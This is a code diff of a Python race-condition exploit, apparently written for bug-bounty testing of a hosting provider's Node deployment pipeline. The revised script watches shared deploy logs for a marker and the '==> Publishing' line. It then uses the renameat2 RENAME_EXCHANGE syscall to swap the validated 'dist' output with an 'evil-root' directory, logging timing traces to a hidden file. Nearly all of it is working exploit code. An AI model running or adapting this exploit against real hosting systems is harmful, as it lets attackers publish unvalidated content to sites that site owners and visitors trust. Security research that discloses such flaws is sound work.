@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Event-triggered owned-path exchange for an authorized publisher TOCTOU gate."""
+"""Swap an owned output path after the publisher logs its validated phase."""
 
 from __future__ import annotations
 
@@ -13,40 +13,62 @@ import time
 SYS_RENAMEAT2 = 316
 AT_FDCWD = -100
 RENAME_EXCHANGE = 2
+MARKER = b"HOSTINGER_NODE_LOG_WATCH_TOCTOU_GATE:r222"
+PUBLISHING = b"==> Publishing"
 libc = ctypes.CDLL(None, use_errno=True)
 dist = os.fsencode("dist")
 alternate = os.fsencode("evil-root")
-deadline = time.monotonic() + 30.0
 started = time.monotonic()
+deadline = started + 30.0
+logs_root = Path.cwd().parents[1] / "logs"
 trace = {
-    "marker": "HOSTINGER_NODE_VERSION_WATCH_TOCTOU_GATE:r221",
+    "marker": MARKER.decode(),
     "event": "not-observed",
+    "logsRootAccessible": logs_root.is_dir(),
 }
 
-try:
-    snapshot = json.loads(Path("r221-versions-before.json").read_text())
-    versions_root = Path(snapshot["versionsRoot"])
-    versions_before = set(snapshot["versionsBefore"])
-except (OSError, KeyError, ValueError, TypeError) as error:
-    versions_root = None
-    versions_before = set()
-    trace.update(event="snapshot-error", error=type(error).__name__)
 
-if versions_root is not None:
+def current_log() -> Path | None:
+    try:
+        candidates = sorted(
+            logs_root.glob("*/*_deploy.log"),
+            key=lambda item: item.stat().st_mtime_ns,
+            reverse=True,
+        )[:8]
+    except OSError:
+        return None
+    for candidate in candidates:
+        try:
+            if MARKER in candidate.read_bytes():
+                return candidate
+        except OSError:
+            continue
+    return None
+
+
+log_path = None
+while time.monotonic() < deadline and log_path is None:
+    log_path = current_log()
+    if log_path is None:
+        time.sleep(0.0005)
+
+if log_path is not None:
+    trace.update(
+        event="current-log-found",
+        logFoundAfterMs=round((time.monotonic() - started) * 1000, 3),
+    )
     while time.monotonic() < deadline:
         try:
-            versions_now = {entry.name for entry in versions_root.iterdir()}
+            tail = log_path.read_bytes()[-4096:]
         except OSError:
-            time.sleep(0.0005)
+            time.sleep(0.00025)
             continue
-        created = sorted(versions_now - versions_before)
-        if not created:
-            time.sleep(0.0005)
+        if PUBLISHING not in tail:
+            time.sleep(0.00025)
             continue
         trace.update(
-            event="version-created",
-            createdCount=len(created),
-            observedAfterMs=round((time.monotonic() - started) * 1000, 3),
+            event="publishing-observed",
+            publishingAfterMs=round((time.monotonic() - started) * 1000, 3),
         )
         result = libc.syscall(
             SYS_RENAMEAT2,
@@ -86,7 +108,7 @@ except OSError:
 
 trace["finishedAfterMs"] = round((time.monotonic() - started) * 1000, 3)
 try:
-    trace_path = Path.home() / ".h1-r221-race-trace.json"
+    trace_path = Path.home() / ".h1-r222-race-trace.json"
     trace_path.write_text(json.dumps(trace, sort_keys=True))
     trace_path.chmod(0o600)
 except OSError:
